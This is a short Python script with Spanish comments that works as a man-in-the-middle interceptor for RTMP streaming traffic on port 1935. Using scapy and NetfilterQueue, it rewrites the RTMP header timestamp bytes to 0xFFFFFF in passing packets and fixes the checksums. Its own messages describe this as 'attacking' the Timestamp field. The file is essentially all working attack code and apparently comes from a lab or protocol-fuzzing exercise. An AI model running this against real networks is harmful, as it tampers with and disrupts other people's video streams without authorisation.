from scapy.all import *
from netfilterqueue import NetfilterQueue

def procesar_paquete(packet):
    scapy_pkt = IP(packet.get_payload())
    
    if scapy_pkt.haslayer(TCP) and scapy_pkt.haslayer(Raw):
        if scapy_pkt[TCP].dport == 1935 or scapy_pkt[TCP].sport == 1935:
            payload = bytearray(scapy_pkt[Raw].load)
            
            # --- MODIFICACIÓN ESPECÍFICA 2: Timestamp ---
            # Filtramos paquetes con carga útil
            if len(payload) > 50:
                # En la cabecera RTMP, los bytes 1, 2 y 3 corresponden al Timestamp.
                # Los forzamos al máximo valor posible (255) para mandarlos al "futuro".
                payload[1] = 255
                payload[2] = 255
                payload[3] = 255
                
                print(f"[!] MODIFICACIÓN 2: 'Timestamp' alterado al futuro (0xFFFFFF). Tamaño: {len(payload)}")
            
            # Reensamblamos el paquete
            scapy_pkt[Raw].load = bytes(payload)
            del scapy_pkt[IP].len
            del scapy_pkt[IP].chksum
            del scapy_pkt[TCP].chksum
            packet.set_payload(bytes(scapy_pkt))
            
    packet.accept()

nfqueue = NetfilterQueue()
nfqueue.bind(1, procesar_paquete)

print("[*] Interceptor Klis activado: Atacando el campo 'Timestamp'...")
try:
    nfqueue.run()
except KeyboardInterrupt:
    print("\n[*] Apagando interceptor...")
nfqueue.unbind()
